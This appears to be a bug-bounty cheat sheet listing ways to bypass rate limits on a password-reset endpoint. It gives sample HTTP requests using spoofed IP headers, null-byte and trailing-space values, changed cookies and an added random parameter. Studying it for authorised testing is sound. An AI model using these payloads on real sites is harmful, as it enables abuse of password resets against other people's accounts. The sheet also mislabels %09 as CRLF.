# Bypass Rate Limit
1. Try add some custom header
```
X-Forwarded-For : 127.0.0.1
X-Host : 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP : 127.0.0.1
X-Remote-IP : 127.0.0.1
X-Remote-Addr : 127.0.0.1    

#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1

```


2. Adding Null Byte ( %00 ) or CRLF ( %09, %0d, %0a )  or Add space after the parameter value.
```                                                                 
POST /ForgotPass.php HTTP/1.1                              
Host: target.com
[...]

email=victim@gmail.com%00
{"email":"victim@gmail.com "}
```

3. Try changing user-agents, cookies and IP address
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: xxxxxxxxxx
[...]

email=victim@gmail.com
```
Try this to bypass
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: aaaaaaaaaaaaa
[...]

email=victim@gmail.com
```

4. Add a random parameter on the last endpoint
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
[...]

email=victim@gmail.com
```
Try this to bypass
```
POST /ForgotPass.php?random HTTP/1.1
Host: target.com
[...]

email=victim@gmail.com
```

5. Add space after the parameter value
```
POST /api/forgotpass HTTP/1.1
Host: target.com
[...]

{"email":"victim@gmail.com"}
```
Try this to bypass
```
POST /api/forgotpass HTTP/1.1
Host: target.com
[...]

{"email":"victim@gmail.com "}
```
